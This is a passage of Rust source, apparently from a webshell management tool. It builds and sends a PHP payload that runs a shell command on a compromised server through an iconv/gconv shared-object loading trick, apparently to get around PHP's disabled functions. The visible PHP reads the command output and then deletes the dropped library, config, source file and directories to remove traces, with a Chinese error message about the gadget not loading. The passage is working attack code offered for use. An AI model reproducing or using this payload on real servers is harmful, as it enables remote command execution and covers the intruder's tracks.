$output = file_exists($of) ? @file_get_contents($of) : '';
// 清理
@unlink($of);
@unlink($so); @unlink($cf); @unlink($src);
@rmdir($gconvDir); @rmdir($base);
echo json_encode(array('ok' => strlen((string)$output) > 0 || $r !== false,
    'output' => base64_encode((string)$output), 'output_text' => (string)$output,
    'error' => strlen((string)$output) === 0 ? 'iconv 未触发加载（版本/glibc 差异）' : null));
"#,
            cmd = serde_json::to_string(&cmd).unwrap_or_else(|_| "\"id\"".to_string()),
            out = BYPASS_OUT,
        )
        .replace("__C__", ICONV_GADGET_C);
        run_payload(protocol, session, &code, settings)
    }
}
